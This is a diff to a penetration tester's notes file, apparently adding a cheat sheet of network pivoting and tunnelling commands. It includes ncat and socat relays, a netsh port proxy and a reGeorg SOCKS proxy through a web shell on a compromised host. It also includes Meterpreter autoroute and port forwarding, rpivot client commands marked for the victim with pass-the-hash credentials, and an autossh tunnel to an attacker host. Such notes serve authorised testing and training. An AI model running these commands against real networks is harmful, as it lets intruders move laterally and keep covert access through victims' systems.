@@ -49,14 +49,73 @@ nano $(locate /rinted.conf\n)
 awk '/#\<bindadress\<bindport\<connectaddress\<connectport/ {for i=1; i<=2; i++}'
 
 
+netcat
+ncat -lvkp 12345 -c "ncat --ssl 192.168.0.1 443"
+	-Port forwarding using ncat
+LISTEN
+ncat -v -l -p 8080 -c "ncat -v -l -p 9090"	#localhost
+ncat localhost -p 8080 < file				#remote host
+ncat localhost 9090 > newfile				#remote host
+	-Netcat Pivot host
+socat -v tcp-listen:8080 tcp-listen:9090	#localhost
+	-socat pivot host
+LISTEN - CONNECT
+ncat -l -v -p 8080 -c "ncat localhost 9090"	#localhost
+socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090	#localhost
+ncat localhost -p 8080 < file		#remote host
+ncat localhost -lp 9090 > newfile	#remote host
+CONNECT
+ncat localhost 8080 -c "ncat localhost 9090"	#localhost
+socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090	#localhost
+ncat localhost -p 8080 < file		#remote host
+ncat localhost -lp 9090 > newfile	#remote host
+
+Build port relay, Windows 7+
+netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>
+
+Web Shell SOCKS Proxy
+python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp
 
 
-Scanning
+
+Metasploit
+meterpreter>run autoroute -s 192.168.5.1/24
+meterpreter>run autoroute -p
+msfconsole>use auxiliary/server/socks4a
+	set SRVPORT 8080
+	exploit
+portfwd add -L 127.0.0.1 -l 3389 -r 192.168.1.111 -p 3389
+	-orward rdesktop sessions from localhost port 3389 to the target 192.168.1.111 through Meterpreter as a tunnel
+
+Rpivot
+https://github.com/artkond/rpivot
+python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0	#attacker
+python client.py --server-ip <ip> --server-port 9443	#victim
+python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
+	-through corporate/enterprise proxy
+python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] --ntlm-proxy-port 8080 --domain CORP --username jdoe --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
+	-pass-the-hash
+
+AutoSSH
+http://www.harding.motd.ca/autossh/
+http://www.harding.motd.ca/autossh/autossh-1.4f.tgz
+	checksum: http://www.harding.motd.ca/autossh/autossh-1.4f.cksums
+autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -L 2222:localhost:22 [evil]@[attacker]
+	
+VNC over SSH Tunnel
+tightvncserver -geometry 1024x768
+ssh -L 5901:localhost:5901 -i .ssh/ssh.key -N -f user@192.168.2.111
+
+SSH over HTTP (SQUID)
+socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.111:127.0.0.1:22,proxyport=3128
+ssh user@127.0.0.1 -p 9999
+
+proxytunnel
+proxytunnel -p 192.168.1.111:3128 -d 127.0.0.1:22 -a 5555
+ssh user@127.0.0.1 -p 5555
+	
+Scanning:
 FTP Bounce
-
 Idle Scan
-
-
-Sniffing
 
 
